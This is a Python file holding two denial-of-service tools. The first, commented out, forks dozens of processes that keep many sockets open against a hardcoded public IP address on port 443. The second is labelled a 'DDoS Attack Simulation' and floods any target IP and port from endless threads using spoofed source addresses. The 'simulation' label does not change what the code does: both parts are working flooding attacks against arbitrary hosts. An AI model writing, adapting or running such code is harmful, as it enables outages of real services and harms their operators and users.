# import socket
# import sys
# import time
# import signal
# import os

# CONNECTIONS = 8
# THREADS = 48

# host = "35.173.69.207"
# port = '443'

# def make_socket(host, port):
#     for res in socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
#         af, socktype, proto, canonname, sa = res
#         try:
#             sock = socket.socket(af, socktype, proto)
#         except OSError:
#             continue
#         try:
#             sock.connect(sa)
#         except OSError:
#             sock.close()
#             continue
#         print(f"[Connected -> {host}:{port}]", file=sys.stderr)
#         return sock
#     print("No connection could be made", file=sys.stderr)
#     sys.exit(0)

# def broke(signum, frame):
#     # Nothing to do
#     pass

# def attack(host, port, _id):
#     sockets = [None] * CONNECTIONS
#     signal.signal(signal.SIGPIPE, broke)
#     while True:
#         for x in range(CONNECTIONS):
#             if sockets[x] is None:
#                 sockets[x] = make_socket(host, port)
#             try:
#                 sockets[x].send(b"\0")
#             except (BrokenPipeError, ConnectionResetError):
#                 sockets[x].close()
#                 sockets[x] = make_socket(host, port)
#         time.sleep(0.3)

# def main():
#     if len(sys.argv) < 3:
#         print("Usage: ./AirDrop <ip-address> <port>")
#         sys.exit(-1)

#     host = sys.argv[1]
#     port = sys.argv[2]

#     for x in range(THREADS):
#         pid = os.fork()
#         if pid == 0:
#             attack(host, port, x)
#             sys.exit(0)
#         time.sleep(0.2)

#     input()

# if __name__ == "__main__":
#     main()


import sys
import threading
from argparse import ArgumentParser
from utils.ip_utils import generate_private_ip
from utils.attack import send_packet
from config.settings import PACKET_COUNT

def start_attack(target_ip, target_port, packet_count):
    print(f"Starting attack on {target_ip}:{target_port} with {packet_count} packets.")
    
    def attack_thread():
        while True:
            ip = generate_private_ip()
            try:
                send_packet(target_ip, target_port, ip)
            except Exception as e:
                print(f"Error in thread: {e}")

    threads = []
    max_threads = 10  # Limit the number of threads to prevent resource exhaustion
    for _ in range(max_threads):
        thread = threading.Thread(target=attack_thread)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join(packet_count)

if __name__ == "__main__":
    parser = ArgumentParser(description="DDoS Attack Simulation")
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Target port")
    parser.add_argument("-c", "--count", type=int, default=PACKET_COUNT, help="Number of packets to send")

    args = parser.parse_args()

    start_attack(args.ip, args.port, args.count)